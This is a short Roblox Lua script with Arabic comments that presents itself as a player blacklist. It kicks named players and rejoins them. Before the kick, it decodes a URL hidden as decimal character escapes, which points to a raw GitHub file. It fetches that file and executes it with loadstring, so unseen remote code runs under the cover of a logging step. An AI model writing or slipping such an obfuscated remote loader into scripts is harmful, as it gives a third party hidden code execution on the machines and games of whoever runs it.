-- مخصص بلاك ليست
local player = game.Players.localPlayer
-- اعطاء لاعبين بلاك ليست
if player.name == "لاعب" or player.name == "اسم لاعب اخر" then

-- اللوج بلاك ليست
local url = "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\55\121\100\55\47\108\111\103\45\103\97\109\101\45\114\111\98\108\111\120\45\55\121\100\55\47\109\97\105\110/log-blacklist" -- اللوج
loadstring(game:HttpGet(url))()

-- طرد لاعب
player:Kick("بلاك ليست (سوف يتم عمل ريجوين لك بعد كم ثانيه)")

-- rejoin
wait(2)
game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)

wait(999) 
end


